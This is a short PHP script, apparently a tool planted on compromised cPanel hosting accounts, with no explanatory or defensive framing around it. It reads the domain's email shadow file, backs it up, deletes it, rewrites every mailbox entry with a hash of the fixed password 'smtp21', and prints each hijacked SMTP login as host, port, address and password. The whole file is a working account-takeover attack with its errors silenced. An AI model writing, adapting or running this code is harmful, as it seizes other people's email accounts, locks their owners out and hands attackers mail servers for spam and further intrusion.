<?php
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit',-1);
// port to scan
$ports=array(25, 587, 465, 110, 995, 143 , 993);
$primary_port='25';
//curent user
$user=get_current_user();
// Smtp password
$password='smtp21';
//crypt
$pwd = crypt($password,'$6$smtp21$');
// host name
 $t = $_SERVER['SERVER_NAME'];
//edit
 $t = @str_replace("www.","",$t);
 //get users
@$passwd = file_get_contents('/home/'.$user.'/etc/'.$t.'/shadow');
//edit
$ex=explode("\r\n",$passwd);
//backup shadow
@link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.smtp21.bak');
//delete shadow
@unlink('/home/'.$user.'/etc/'.$t.'/shadow');
// :D
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.$user.'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
echo '<span style=\'color:#00ff00;\'>'.$t.'|25|'.$e.'@'.$t.'|'.$password.'</span><br>';  "</center>";
}}
?>